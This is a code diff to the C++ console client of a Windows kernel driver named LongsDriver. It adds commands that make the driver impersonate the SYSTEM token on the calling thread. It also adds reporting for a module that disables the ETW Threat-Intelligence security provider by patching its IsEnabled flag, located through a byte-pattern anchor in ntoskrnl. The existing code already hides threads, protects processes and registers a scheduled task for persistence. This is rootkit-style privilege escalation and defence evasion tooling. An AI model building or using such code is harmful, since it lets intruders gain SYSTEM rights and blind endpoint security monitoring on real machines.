@@ -28,6 +28,10 @@ enum CmdId {
   CMD_PROTECT_PROCESS,
   CMD_UNPROTECT_PROCESS,
   CMD_LIST_PROTECTED,
+  CMD_ELEVATE,
+  CMD_UNELEVATE,
+  CMD_ELEVATION_STATUS,
+  CMD_ETWTI_STATUS,
   CMD_EXIT = 0
 };
 
@@ -53,12 +57,18 @@ static const ClientCommand kCommands[] = {
     {CMD_PROTECT_PROCESS, "Protect Process", true, "PID (Enter=target)"},
     {CMD_UNPROTECT_PROCESS, "Unprotect Process", true, "PID (Enter=target)"},
       {CMD_LIST_PROTECTED, "List Protected", false, NULL},
+    {CMD_ELEVATE, "Elevate Self", false, NULL},
+    {CMD_UNELEVATE, "Unelevate Self", false, NULL},
+    {CMD_ELEVATION_STATUS, "Elevation Status", false, NULL},
+    {CMD_ETWTI_STATUS, "ETW-TI Status", false, NULL},
   };
 
 static std::string g_targetName;
 static ULONG g_targetPid = 0;
 static ULONG g_targetTid = 0;
 static bool g_autoEnabled = false;
+static long g_etwTiValue = -1; // live IsEnabled, -1 = not queried yet
+static bool g_etwTiHeld = false; // module is the reason it is off
 
 static void PrintMenu() {
   std::cout << "\n=== LongsDriver ===\n";
@@ -66,6 +76,9 @@ static void PrintMenu() {
     std::cout << "Target: " << g_targetName << " PID=" << g_targetPid
               << " TID=" << g_targetTid << "\n";
   std::cout << "Auto load: " << (g_autoEnabled ? "ON" : "OFF") << "\n";
+  if (g_etwTiValue >= 0)
+    std::cout << "ETW-TI: " << (g_etwTiValue ? "ON" : "OFF")
+              << (g_etwTiHeld ? "  (module is holding it down)" : "") << "\n";
   for (const auto& c : kCommands) {
     std::cout << " [" << c.id << "] ";
     if (c.id == CMD_AUTO_LOAD)
@@ -453,6 +466,156 @@ static void RunProtect(HANDLE h, ULONG pid, bool protect) {
   std::cout << "ok\n";
 }
 
+//
+// Token elevation. The driver attaches the System token to the thread that
+// issued the call, so these commands work on this process and on no other:
+// there is no PID to pass. The token stays on this thread after the call
+// returns, which is the difference from TaskPersistence, and it is dropped
+// when this thread exits or "Unelevate Self" runs.
+//
+static void RunElevate(HANDLE h, DWORD ioctl, const char* verb) {
+  ELEVATE_STATUS_RESPONSE r = {0};
+  DWORD ret = 0;
+
+  std::cout << "  " << verb << " -> ";
+  if (!DeviceIoControl(h, ioctl, NULL, 0, &r, sizeof(r), &ret, NULL)) {
+    std::cout << "failed (0x" << std::hex << GetLastError() << std::dec
+              << ")\n";
+    return;
+  }
+  if (!NT_SUCCESS(r.Status)) {
+    std::cout << "refused, NTSTATUS 0x" << std::hex << r.Status << std::dec
+              << "\n";
+    return;
+  }
+
+  // Report what the thread ended up with, not what was asked for: the set can
+  // succeed while the token does not take, and only the driver's query knows.
+  if (r.Elevated) {
+    std::cout << "ok, this thread (TID " << r.ThreadId
+              << ") now runs as SYSTEM\n";
+  } else {
+    std::cout << "driver reported no impersonation token on TID " << r.ThreadId
+              << "\n";
+  }
+}
+
+static void RunElevateStatus(HANDLE h) {
+  ELEVATE_STATUS_RESPONSE r = {0};
+  DWORD ret = 0;
+
+  if (!DeviceIoControl(h, IOCTL_QUERY_ELEVATION, NULL, 0, &r, sizeof(r), &ret,
+                       NULL)) {
+    std::cout << "  Elevation query failed (0x" << std::hex << GetLastError()
+              << std::dec << ")\n";
+    return;
+  }
+  if (!NT_SUCCESS(r.Status)) {
+    std::cout << "  Elevation query refused, NTSTATUS 0x" << std::hex << r.Status
+              << std::dec << "\n";
+    return;
+  }
+
+  std::cout << "  Thread " << r.ThreadId << ": "
+            << (r.Elevated ? "impersonating SYSTEM" : "using process token")
+            << "\n";
+}
+
+//
+// ETW-TI. The driver keeps the IRP status at STATUS_SUCCESS and puts the real
+// outcome in Response->Status, so a Win32 failure here means the call never
+// reached the module: wrong buffer size, or no handle. Both must be told apart
+// from a refusal, otherwise "access denied" and "this build is not 26100" look
+// identical on the console.
+//
+static void DescribeEtwTiStatus(LONG s) {
+  switch ((ULONG)s) {
+  case 0x00000000:
+    std::cout << "STATUS_SUCCESS";
+    break;
+  case 0xC0000059:
+    std::cout << "STATUS_REVISION_MISMATCH -> this ntoskrnl is not the "
+                 "verified build 26100.4351, or the Threat-Intelligence GUID "
+                 "is gone, or the anchor landed outside the image";
+    break;
+  case 0xC0000225:
+    std::cout << "STATUS_NOT_FOUND -> ntoskrnl, an exported "
+                 "KeInsertQueueApc, or the 4C 8B 15 anchor was not found, or "
+                 "EtwRegister has not run yet for the Threat-Intelligence "
+                 "provider (normal right after boot)";
+    break;
+  case 0xC000003E:
+    std::cout << "STATUS_DATA_ERROR -> a chain hop was not a kernel pointer, "
+                 "or IsEnabled was neither 0 nor 1 (layout changed)";
+    break;
+  case 0xC0000005:
+    std::cout << "STATUS_ACCESS_VIOLATION -> walking the chain faulted";
+    break;
+  case 0xC0000182:
+    std::cout << "STATUS_DEVICE_CONFIGURATION_ERROR -> the write did not "
+                 "take, or the enable record moved since disable";
+    break;
+  case 0xC0000184:
+    std::cout << "STATUS_INVALID_DEVICE_STATE -> not at PASSIVE_LEVEL, or "
+                 "disabled without a saved value to restore";
+    break;
+  default:
+    std::cout << "see DbgPrint for the reason";
+    break;
+  }
+}
+
+static void RunEtwTi(HANDLE h, DWORD ioctl, const char* verb) {
+  ETWTI_STATUS_RESPONSE r = {0};
+  DWORD ret = 0;
+
+  if (!DeviceIoControl(h, ioctl, NULL, 0, &r, sizeof(r), &ret, NULL)) {
+    DWORD err = GetLastError();
+    std::cout << "  ETW-TI " << verb << ": call failed, 0x" << std::hex << err
+              << std::dec;
+    if (err == ERROR_INSUFFICIENT_BUFFER || err == ERROR_MORE_DATA)
+      std::cout << " (client/driver struct size mismatch - rebuild both)";
+    else if (err == ERROR_INVALID_HANDLE || err == ERROR_ACCESS_DENIED)
+      std::cout << " (driver not loaded, or handle stale)";
+    std::cout << "\n";
+    return;
+  }
+
+  std::cout << "  ETW-TI " << verb << ": ";
+  if (!NT_SUCCESS(r.Status)) {
+    std::cout << "FAILED 0x" << std::hex << r.Status << std::dec << " - ";
+    DescribeEtwTiStatus((LONG)r.Status);
+    std::cout << "\n";
+    return;
+  }
+  std::cout << "ok\n";
+
+  // Report the live chain rather than only a yes/no: on a VM run these are the
+  // numbers to compare against a debugger dump, and the record address is the
+  // one IsEnabled actually lives at.
+  std::cout << "    module Disabled=" << r.Disabled
+            << "  SavedValue=" << r.SavedValue << "  CurrentValue=";
+  if (r.CurrentValue == 0xFFFFFFFFul)
+    std::cout << "unresolved";
+  else
+    std::cout << r.CurrentValue;
+  std::cout << "  worker tries=" << r.ArmAttempts << "\n";
+  if (r.EnableInfoAddress != 0)
+    std::cout << "    slot=0x" << std::hex << r.SlotAddress
+              << "  entry=0x" << r.EntryAddress << "  info=0x"
+              << r.EnableInfoAddress << "  IsEnabled=info+0x60=0x"
+              << (r.EnableInfoAddress + 0x60) << std::dec << "\n";
+  else
+    std::cout << "    chain unresolved\n";
+
+  // Tracked separately because "off" and "the module is why it is off" are not
+  // the same fact: a boot where the provider never latched is also OFF, and a
+  // disable that captured a saved value of 0 restores to OFF while the module
+  // holds nothing.
+  g_etwTiValue = (long)r.CurrentValue;
+  g_etwTiHeld = (r.Disabled != 0);
+}
+
 static void RunProtectedList(HANDLE h) {
   PROTECT_STATUS_RESPONSE st = {0};
   DWORD ret = 0;
@@ -629,6 +792,11 @@ int wmain(int argc, wchar_t* argv[]) {
     // One-time registration so the machine needs no manual schtasks step.
     // Wrapped so a helper failure can never swallow the menu.
     RegisterTaskSafely();
+
+    // Show the live ETW-TI state up front so a VM run needs no extra keystroke
+    // to find out whether the module is holding it down.
+    std::cout << "\n--- ETW-TI ---\n";
+    RunEtwTi(hDevice, IOCTL_ETWTI_STATUS, "Status");
   }
 
   for (;;) {
@@ -726,6 +894,18 @@ int wmain(int argc, wchar_t* argv[]) {
         break;
       case CMD_LIST_PROTECTED:
         RunProtectedList(hDevice);
+        break;
+      case CMD_ELEVATE:
+        RunElevate(hDevice, IOCTL_ELEVATE_SELF, "Elevate this thread");
+        break;
+      case CMD_UNELEVATE:
+        RunElevate(hDevice, IOCTL_UNELEVATE_SELF, "Unelevate this thread");
+        break;
+      case CMD_ELEVATION_STATUS:
+        RunElevateStatus(hDevice);
+        break;
+      case CMD_ETWTI_STATUS:
+        RunEtwTi(hDevice, IOCTL_ETWTI_STATUS, "Status");
         break;
   case CMD_HIDE_THREAD: {
         THREAD_REQUEST req = {params[i]};
